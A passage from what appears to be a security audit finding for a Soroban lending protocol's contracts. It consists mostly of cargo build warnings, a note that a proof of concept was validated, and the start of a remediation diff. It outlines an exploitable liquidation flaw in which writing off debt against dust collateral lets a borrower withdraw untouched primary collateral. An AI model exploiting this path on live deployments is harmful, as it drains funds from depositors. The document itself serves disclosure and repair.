350 |                     env.events().publish(
    |                                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:398:34
    |
398 |                     env.events().publish(
    |                                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:417:38
    |
417 |                         env.events().publish(
    |                                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:584:22
    |
584 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/price-oracle/src/contract.rs:673:22
    |
673 |         env.events().publish(
    |                      ^^^^^^^

warning: `k2-pool-configurator` (lib) generated 26 warnings
warning: `k2_treasury` (lib) generated 3 warnings
warning: `k2-debt-token` (lib) generated 3 warnings
warning: `k2-price-oracle` (lib) generated 13 warnings
warning: unused import: `panic_with_error`
 --> contracts/incentives/src/contract.rs:7:43
  |
7 | use soroban_sdk::{contract, contractimpl, panic_with_error, symbol_short, Address, Env, Map, Symbol, Vec};
  |                                           ^^^^^^^^^^^^^^^^
  |
  = note: `#[warn(unused_imports)]` (part of `#[warn(unused)]`) on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:175:26
    |
175 |             env.events().publish(
    |                          ^^^^^^^
    |
    = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:340:26
    |
340 |             env.events().publish(
    |                          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:504:30
    |
504 |                 env.events().publish(
    |                              ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:570:22
    |
570 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:652:22
    |
652 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:706:22
    |
706 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:754:22
    |
754 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:809:22
    |
809 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:832:22
    |
832 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:852:22
    |
852 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/incentives/src/contract.rs:900:22
    |
900 |         env.events().publish(
    |                      ^^^^^^^

warning: variable does not need to be mutable
   --> contracts/incentives/src/contract.rs:622:21
    |
622 |                 let mut args = Vec::new(&env);
    |                     ----^^^^
    |                     |
    |                     help: remove this `mut`
    |
    = note: `#[warn(unused_mut)]` (part of `#[warn(unused)]`) on by default

warning: function `get_lending_pool` is never used
   --> contracts/incentives/src/storage.rs:120:8
    |
120 | pub fn get_lending_pool(env: &Env) -> Option<Address> {
    |        ^^^^^^^^^^^^^^^^
    |
    = note: `#[warn(dead_code)]` (part of `#[warn(unused)]`) on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/a-token/src/contract.rs:54:22
   |
54 |         env.events().publish(
   |                      ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/a-token/src/contract.rs:243:22
    |
243 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/a-token/src/contract.rs:305:22
    |
305 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/a-token/src/contract.rs:432:22
    |
432 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/a-token/src/contract.rs:522:22
    |
522 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/a-token/src/contract.rs:676:22
    |
676 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/a-token/src/contract.rs:789:26
    |
789 |             env.events().publish(
    |                          ^^^^^^^

warning: function `total_supply_with_index` is never used
  --> contracts/a-token/src/balance.rs:68:8
   |
68 | pub fn total_supply_with_index(env: &Env, index: u128) -> Result<u128, TokenError> {
   |        ^^^^^^^^^^^^^^^^^^^^^^^
   |
   = note: `#[warn(dead_code)]` (part of `#[warn(unused)]`) on by default

warning: function `balance_of_with_timestamp` is never used
  --> contracts/a-token/src/balance.rs:76:8
   |
76 | pub fn balance_of_with_timestamp(env: &Env, user: &Address, last_update_timestamp: u64) -> Result<u128, TokenError> {
   |        ^^^^^^^^^^^^^^^^^^^^^^^^^

warning: unused import: `ray_div`
 --> contracts/kinetic-router/src/calculation.rs:3:84
  |
3 |     calculate_compound_interest, calculate_linear_interest, get_current_timestamp, ray_div,
  |                                                                                    ^^^^^^^
  |
  = note: `#[warn(unused_imports)]` (part of `#[warn(unused)]`) on by default

warning: unused imports: `AMMRouterUpdated`, `AdminAcceptedEvent`, `AdminProposalCancelledEvent`, `AdminProposedEvent`, `BorrowEvent`, `FlashLoanEvent`, `LiquidationCallEvent`, `LiquidationFeeTransferFailedEvent`, `RepayEvent`, `ReserveDataUpdatedEvent`, `ReserveUsedAsCollateralEvent`, `SupplyEvent`, and `WithdrawEvent`
 --> contracts/kinetic-router/src/events.rs:3:5
  |
3 |     AdminAcceptedEvent, AdminProposalCancelledEvent, AdminProposedEvent, AMMRouterUpdated,
  |     ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^
4 |     BorrowEvent, FlashLoanEvent, LiquidationCallEvent, LiquidationFeeTransferFailedEvent,
  |     ^^^^^^^^^^^  ^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |     RepayEvent, ReserveDataUpdatedEvent, ReserveUsedAsCollateralEvent, SupplyEvent,
  |     ^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^
6 |     WithdrawEvent,
  |     ^^^^^^^^^^^^^

warning: unused import: `panic_with_error`
 --> contracts/kinetic-router/src/flash_loan.rs:3:19
  |
3 | use soroban_sdk::{panic_with_error, token, Address, Bytes, Env, IntoVal, Symbol, Vec};
  |                   ^^^^^^^^^^^^^^^^

warning: unused import: `Vec`
 --> contracts/kinetic-router/src/validation.rs:4:39
  |
4 | use soroban_sdk::{Address, Env, U256, Vec};
  |                                       ^^^

warning: unused import: `validation`
 --> contracts/kinetic-router/src/views.rs:1:35
  |
1 | use crate::{calculation, storage, validation};
  |                                   ^^^^^^^^^^

warning: unused imports: `WAD`, `dex`, `safe_i128_to_u128`, and `safe_u128_to_i128`
 --> contracts/kinetic-router/src/views.rs:2:17
  |
2 | use k2_shared::{dex, safe_i128_to_u128, safe_u128_to_i128, KineticRouterError, ReserveData, UserAccountData, UserConfiguration, WAD};
  |                 ^^^  ^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^                                                                       ^^^

warning: unused import: `IntoVal`
 --> contracts/kinetic-router/src/views.rs:3:33
  |
3 | use soroban_sdk::{Address, Env, IntoVal, Vec};
  |                                 ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/kinetic-router/src/access_control.rs:32:10
   |
32 |         .publish((symbol_short!("wlist"), asset.clone()), whitelist.len());
   |          ^^^^^^^
   |
   = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/kinetic-router/src/access_control.rs:72:10
   |
72 |         .publish((symbol_short!("liqwlist"), 0), whitelist.len());
   |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/access_control.rs:111:10
    |
111 |         .publish((symbol_short!("rblack"), asset.clone()), blacklist.len());
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/access_control.rs:149:10
    |
149 |         .publish((symbol_short!("liqblack"), 0), blacklist.len());
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/access_control.rs:190:10
    |
190 |         .publish((symbol_short!("swpwlist"), 0u32), whitelist.len());
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/calculation.rs:497:18
    |
497 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/calculation.rs:967:22
    |
967 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/flash_loan.rs:294:26
    |
294 |             env.events().publish(
    |                          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/liquidation.rs:459:50
    |
459 | ...                   env.events().publish(
    |                                    ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/liquidation.rs:615:26
    |
615 |             env.events().publish(
    |                          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/liquidation.rs:692:18
    |
692 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/operations.rs:118:18
    |
118 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/operations.rs:268:18
    |
268 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/operations.rs:434:18
    |
434 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/operations.rs:576:18
    |
576 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/kinetic-router/src/params.rs:21:10
   |
21 |         .publish((symbol_short!("fl_prem"),), premium_bps);
   |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/kinetic-router/src/params.rs:37:18
   |
37 |     env.events().publish(
   |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/kinetic-router/src/params.rs:63:18
   |
63 |     env.events().publish(
   |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/kinetic-router/src/params.rs:90:18
   |
90 |     env.events().publish(
   |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/params.rs:118:18
    |
118 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/params.rs:147:18
    |
147 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/params.rs:180:18
    |
180 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/params.rs:206:18
    |
206 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/params.rs:234:10
    |
234 |         .publish((symbol_short!("fl_liq"), symbol_short!("prem")), premium_bps);
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/params.rs:251:10
    |
251 |         .publish((symbol_short!("treasury"), EVENT_SET), treasury);
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/params.rs:268:10
    |
268 |         .publish((symbol_short!("fliqhelp"), EVENT_SET), helper);
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/params.rs:285:10
    |
285 |         .publish((symbol_short!("pconfig"), EVENT_SET), configurator);
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/params.rs:317:18
    |
317 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/reserve.rs:108:18
    |
108 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/reserve.rs:171:10
    |
171 |         .publish((EVENT_SET_CAP, asset.clone()), (EVENT_SUPPLY, supply_cap));
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/reserve.rs:198:10
    |
198 |         .publish((EVENT_SET_CAP, asset.clone()), (EVENT_BORROW, borrow_cap));
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/reserve.rs:226:10
    |
226 |         .publish((EVENT_SET_CAP, asset.clone()), (EVENT_DEBT_CEIL, debt_ceiling));
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/reserve.rs:254:18
    |
254 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/reserve.rs:349:18
    |
349 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/reserve.rs:373:18
    |
373 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/reserve.rs:406:10
    |
406 |         .publish((event_topic, asset.clone()), new_wasm_hash.clone());
    |          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/reserve.rs:501:18
    |
501 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/kinetic-router/src/router.rs:46:22
   |
46 |         env.events().publish(
   |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/kinetic-router/src/router.rs:58:18
   |
58 |     env.events().publish(
   |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/kinetic-router/src/router.rs:88:18
   |
88 |     env.events().publish(
   |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/router.rs:114:18
    |
114 |     env.events().publish(
    |                  ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/router.rs:232:22
    |
232 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/router.rs:250:22
    |
250 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/router.rs:683:22
    |
683 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/router.rs:900:26
    |
900 |             env.events().publish(
    |                          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/router.rs:926:26
    |
926 |             env.events().publish(
    |                          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
    --> contracts/kinetic-router/src/router.rs:1048:26
     |
1048 |             env.events().publish(
     |                          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
    --> contracts/kinetic-router/src/router.rs:1152:22
     |
1152 |         env.events().publish(
     |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
    --> contracts/kinetic-router/src/router.rs:1299:22
     |
1299 |         env.events().publish(
     |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
  --> contracts/kinetic-router/src/treasury.rs:81:26
   |
81 |             env.events().publish(
   |                          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/kinetic-router/src/treasury.rs:144:18
    |
144 |     env.events().publish(
    |                  ^^^^^^^

warning: unused variable: `from_amount`
   --> contracts/kinetic-router/src/calculation.rs:590:5
    |
590 |     from_amount: u128,
    |     ^^^^^^^^^^^ help: if this is intentional, prefix it with an underscore: `_from_amount`
    |
    = note: `#[warn(unused_variables)]` (part of `#[warn(unused)]`) on by default

warning: unused variable: `to_amount`
   --> contracts/kinetic-router/src/calculation.rs:591:5
    |
591 |     to_amount: u128,
    |     ^^^^^^^^^ help: if this is intentional, prefix it with an underscore: `_to_amount`

warning: variable does not need to be mutable
   --> contracts/kinetic-router/src/liquidation.rs:181:9
    |
181 |     let mut balance_cache = result.balance_cache;
    |         ----^^^^^^^^^^^^^
    |         |
    |         help: remove this `mut`
    |
    = note: `#[warn(unused_mut)]` (part of `#[warn(unused)]`) on by default

warning: value assigned to `debt_token_scaled_total` is never read
   --> contracts/kinetic-router/src/liquidation.rs:338:53
    |
338 |     let mut debt_token_scaled_total: Option<u128> = None;
    |                                                     ^^^^
    |
    = help: maybe it is overwritten before being read?
    = note: `#[warn(unused_assignments)]` (part of `#[warn(unused)]`) on by default

warning: value assigned to `a_token_scaled_total` is never read
   --> contracts/kinetic-router/src/liquidation.rs:381:50
    |
381 |     let mut a_token_scaled_total: Option<u128> = None;
    |                                                  ^^^^
    |
    = help: maybe it is overwritten before being read?

warning: unused variable: `from_supply_scaled`
   --> contracts/kinetic-router/src/swap.rs:137:35
    |
137 |     let (new_user_scaled_balance, from_supply_scaled, actual_amount) = match burn_transfer_result {
    |                                   ^^^^^^^^^^^^^^^^^^ help: if this is intentional, prefix it with an underscore: `_from_supply_scaled`

warning: unused variable: `to_supply_scaled`
   --> contracts/kinetic-router/src/swap.rs:311:38
    |
311 |     let (to_user_new_scaled_balance, to_supply_scaled) = match mint_result {
    |                                      ^^^^^^^^^^^^^^^^ help: if this is intentional, prefix it with an underscore: `_to_supply_scaled`

warning: function `get_total_supply` is never used
    --> contracts/kinetic-router/src/calculation.rs:1142:8
     |
1142 | pub fn get_total_supply(env: &Env, token_address: &Address) -> Result<u128, KineticRouterError> {
     |        ^^^^^^^^^^^^^^^^
     |
     = note: `#[warn(dead_code)]` (part of `#[warn(unused)]`) on by default

warning: function `set_price_staleness_threshold` is never used
   --> contracts/kinetic-router/src/params.rs:134:8
    |
134 | pub fn set_price_staleness_threshold(env: Env, threshold_seconds: u64) -> Result<(), KineticRouterError> {
    |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

warning: function `get_price_staleness_threshold` is never used
   --> contracts/kinetic-router/src/params.rs:159:8
    |
159 | pub fn get_price_staleness_threshold(env: Env) -> u64 {
    |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

warning: function `get_reserves_count` is never used
   --> contracts/kinetic-router/src/storage.rs:332:8
    |
332 | pub fn get_reserves_count(env: &Env) -> u32 {
    |        ^^^^^^^^^^^^^^^^^^

warning: function `set_price_staleness_threshold` is never used
   --> contracts/kinetic-router/src/storage.rs:602:8
    |
602 | pub fn set_price_staleness_threshold(env: &Env, threshold_seconds: u64) {
    |        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

warning: hiding a lifetime that's elided elsewhere is confusing
  --> contracts/kinetic-router/src/router.rs:22:34
   |
22 | fn acquire_reentrancy_guard(env: &Env) -> ReentrancyGuard {
   |                                  ^^^^     ^^^^^^^^^^^^^^^ the same lifetime is hidden here
   |                                  |
   |                                  the lifetime is elided here
   |
   = help: the same lifetime is referred to in inconsistent ways, making the signature confusing
   = note: `#[warn(mismatched_lifetime_syntaxes)]` on by default
help: use `'_` for type paths
   |
22 | fn acquire_reentrancy_guard(env: &Env) -> ReentrancyGuard<'_> {
   |                                                          ++++

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/interest-rate-strategy/src/contract.rs:180:22
    |
180 |         env.events().publish(
    |                      ^^^^^^^
    |
    = note: `#[warn(deprecated)]` on by default

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/interest-rate-strategy/src/contract.rs:206:26
    |
206 |             env.events().publish(
    |                          ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/interest-rate-strategy/src/contract.rs:219:22
    |
219 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/interest-rate-strategy/src/contract.rs:245:22
    |
245 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/interest-rate-strategy/src/contract.rs:267:22
    |
267 |         env.events().publish(
    |                      ^^^^^^^

warning: use of deprecated method `soroban_sdk::events::Events::publish`: use the #[contractevent] macro on a contract event type
   --> contracts/interest-rate-strategy/src/contract.rs:307:22
    |
307 |         env.events().publish(
    |                      ^^^^^^^

warning: `k2-incentives` (lib) generated 14 warnings (run `cargo fix --lib -p k2-incentives` to apply 2 suggestions)
warning: `k2-a-token` (lib) generated 9 warnings
warning: `k2-kinetic-router` (lib) generated 71 warnings (run `cargo fix --lib -p k2-kinetic-router` to apply 13 suggestions)
warning: `k2-interest-rate-strategy` (lib) generated 6 warnings
warning: use of deprecated method `soroban_sdk::Env::budget`: use cost_estimate().budget()
   --> tests/e2e-harness/src/lib.rs:204:9
    |
204 |     env.budget().reset_unlimited();
    |         ^^^^^^
    |
    = note: `#[warn(deprecated)]` on by default

warning: `k2-e2e-harness` (lib test) generated 1 warning
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.55s
     Running unittests src/lib.rs (target/debug/deps/k2_e2e_harness-8917e38b6a92468a)
```

### Considerations

PoC validated in the repo's pure-cargo Soroban e2e harness with mocked auths and host-registered contracts; it demonstrates the public-entry liquidation flaw, deficit creation, and subsequent withdrawal of the untouched primary collateral, but does not measure mainnet resource usage or market timing.

## Remediation

### Explanation

Only socialize remaining liquidation debt as bad debt when the liquidated collateral reserve is fully exhausted and the borrower has no other collateral reserves with a positive balance. This closes the dust-collateral writeoff path in both direct and prepared liquidation flows without changing normal liquidation behavior.

### Patch

```diff
diff --git a/contracts/kinetic-router/src/liquidation.rs b/contracts/kinetic-router/src/liquidation.rs
--- a/contracts/kinetic-router/src/liquidation.rs
+++ b/contracts/kinetic-router/src/liquidation.rs
@@ -1,709 +1,756 @@
 use crate::{calculation, storage, validation};
 use k2_shared::*;
 use k2_shared::calculate_oracle_to_wad_factor;
 use soroban_sdk::{contracterror, panic_with_error, symbol_short, Address, Env, IntoVal, Map, Symbol, U256, Vec};
 
 use k2_shared::safe_u128_to_i128;
 
 const EV_EVENT: u32 = 1;
 
 /// WP-M2: Validate close factor and check debt_to_cover doesn't exceed max liquidatable amount.
 /// Shared by: internal_liquidation_call, prepare_liquidation, execute_liquidation.
 pub(crate) fn validate_close_factor(
     env: &Env,
     health_factor: u128,
     individual_debt_base: u128,
     individual_collateral_base: u128,
     debt_to_cover_base: u128,
 ) -> Result<(), KineticRouterError> {
     let partial_liq_threshold = storage::get_partial_liquidation_hf_threshold(env);
     let close_factor = if individual_debt_base < MIN_CLOSE_FACTOR_THRESHOLD
         || individual_collateral_base < MIN_CLOSE_FACTOR_THRESHOLD
         || health_factor < partial_liq_threshold {
         MAX_LIQUIDATION_CLOSE_FACTOR
     } else {
         DEFAULT_LIQUIDATION_CLOSE_FACTOR
     };
 
     let max_liquidatable_debt = individual_debt_base
         .checked_mul(close_factor)
         .ok_or(KineticRouterError::MathOverflow)?
         .checked_div(BASIS_POINTS_MULTIPLIER)
         .ok_or(KineticRouterError::MathOverflow)?;
 
     if debt_to_cover_base > max_liquidatable_debt {
         return Err(KineticRouterError::LiquidationAmountTooHigh);
     }
 
     Ok(())
 }
 
 /// F-09: Liquidation-specific errors
 #[contracterror]
 #[derive(Copy, Clone, Debug, Eq, PartialEq, PartialOrd, Ord)]
 #[repr(u32)]
 pub enum LiquidationError {
     LeavesTooLittleDebt = 1,  // Partial liquidation would leave dust debt below minimum threshold
 }
 
 fn address_to_asset(_env: &Env, address: &Address) -> Asset {
     Asset::Stellar(address.clone())
 }
 
 pub fn get_asset_prices_batch(
     env: &Env,
     debt_asset: &Address,
     collateral_asset: &Address,
 ) -> Result<(PriceData, PriceData), KineticRouterError> {
     let price_oracle_address = storage::get_price_oracle_opt(env)
         .ok_or(KineticRouterError::PriceOracleNotFound)?;
 
     let debt_asset_type = address_to_asset(env, debt_asset);
     let collateral_asset_type = address_to_asset(env, collateral_asset);
 
     let mut assets_vec = Vec::new(env);
     assets_vec.push_back(debt_asset_type.clone());
     assets_vec.push_back(collateral_asset_type.clone());
 
     let mut args = Vec::new(env);
     args.push_back(assets_vec.into_val(env));
 
     let sym_get_prices = Symbol::new(env, "get_asset_prices_vec");
     let price_result = env.try_invoke_contract::<Vec<PriceData>, KineticRouterError>(
         &price_oracle_address,
         &sym_get_prices,
         args,
     );
 
     let prices_vec = match price_result {
         Ok(Ok(pv)) => pv,
         Ok(Err(_)) => return Err(KineticRouterError::PriceOracleError),
         Err(_) => return Err(KineticRouterError::PriceOracleInvocationFailed),
     };
 
     if prices_vec.len() != 2 {
         return Err(KineticRouterError::PriceOracleError);
     }
 
     let debt_price_data = prices_vec
         .get(0)
         .ok_or(KineticRouterError::PriceOracleError)?;
     let collateral_price_data = prices_vec
         .get(1)
         .ok_or(KineticRouterError::PriceOracleError)?;
 
     // N-04
     crate::price::validate_price_freshness(env, debt_price_data.timestamp, Some(debt_asset))?;
     crate::price::validate_price_freshness(env, collateral_price_data.timestamp, Some(collateral_asset))?;
 
     Ok((debt_price_data, collateral_price_data))
 }
 
+pub(crate) fn user_has_other_collateral(
+    env: &Env,
+    user_config: &UserConfiguration,
+    balance_cache: &Map<Address, (u128, u128)>,
+    collateral_asset: &Address,
+    collateral_reserve_id: u8,
+) -> Result<bool, KineticRouterError> {
+    let active_reserve_ids = user_config.get_active_reserve_ids(env);
+
+    for i in 0..active_reserve_ids.len() {
+        let reserve_id = active_reserve_ids
+            .get(i)
+            .ok_or(KineticRouterError::ReserveNotFound)?;
